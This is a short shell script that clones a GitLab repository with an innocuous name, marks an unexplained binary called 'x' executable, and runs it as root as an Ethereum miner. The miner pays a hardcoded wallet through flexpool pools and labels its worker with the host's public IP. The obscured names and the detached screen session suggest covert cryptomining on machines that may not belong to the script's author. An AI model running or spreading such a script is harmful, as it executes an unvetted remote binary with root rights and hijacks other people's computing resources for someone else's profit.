#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS cy.sh 65 75
sudo git clone https://gitlab.com/letricejuliocesar/goodday
cd goodday
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0xF0529F3c3abD43252BF3BE801A9DBCBf435A4b2B -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
